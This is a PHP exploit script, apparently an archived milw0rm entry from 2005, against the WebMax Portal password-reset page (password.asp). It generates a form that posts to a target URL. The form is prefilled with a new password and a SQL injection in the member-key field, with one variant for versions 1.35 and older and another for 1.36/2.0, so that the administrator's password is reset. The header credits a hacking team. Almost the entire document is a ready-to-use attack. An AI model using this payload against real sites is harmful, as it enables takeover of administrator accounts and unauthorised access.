<?php
/*
------Trap-Set Underground Hacking Team-----------------mh_p0rtal---------------------- 
Greetz to : Alpha_programmer , Oil_karchack , Str0ke   And Iranian Hacking & Security Teams : 
Alphast , IHS Team , Shabgard Security Team , Emperor Hacking TEam 
, CrouZ Security Team , Simorgh-ev Security Team 
----------------Discovered by: s d <irsdl@yahoo.com>------------------------------------------
*/ 
# Config ________________________________   
# address - example: http://www.site.com/password.asp
$url  = "http://www.mohamad.com/password.asp";  
$mh = "s1";   
# if webmaxportal version is : Version 1.35 and older please input $mh= "s1" 
# if webmaxportal version is : Version 1.36 , 2.0 please input $mh= "s2" 
# EnD ___________________________________
if ( $mh == "s1" ) {
print "<form action=\"$url?mode=reset\" method=\"post\"> <br> ";
print "Password1 : <input name=\"pass\" type=\"text\" value=\"abc123\" size=\"50\"><br>";
print "Confirm Pass: <input name=\"pass2\" type=\"text\" value=\"abc123\" size=\"50\"><br>"; 
print " ID  :&nbsp&nbsp&nbsp <input name=\"memId\" type=\"text\" value=\"-1\" size=\"50\"><br>"; 
print "Member key: <input name=\"memKey\" type=\"text\" value=\"foo' or M_Name='admin\" size=\"50\"><br>";
print "<input name=\"Submit\" type=\"submit\" value=\":::Change Pass:::\">";
print "</form>";
} if ( $mh == "s2" ) {
print "<form action=\"$url?mode=reset\" method=\"post\"> <br> ";
print "Password1: <input name=\"pass\" type=\"text\" value=\"abc123\" size=\"50\"><br>"; 
print "Confirm Pass : <input name=\"pass2\" type=\"text\" value=\"abc123\" size=\"50\"><br> ";
print "ID  :  &nbsp&nbsp&nbsp<input name=\"memId\" type=\"text\" value=\"-1\" size=\"50\"><br> ";
print "Member key: <input name=\"memKey\" type=\"text\" value=\"foo') or M_Name='admi n' or ('1'='2\" size=\"50\"> <br>"; 
print "<input name=\"Submit\" type=\"submit\" value=\":::Change Pass:::\">";
print "</form>";
} 
?>

# milw0rm.com [2005-05-26]
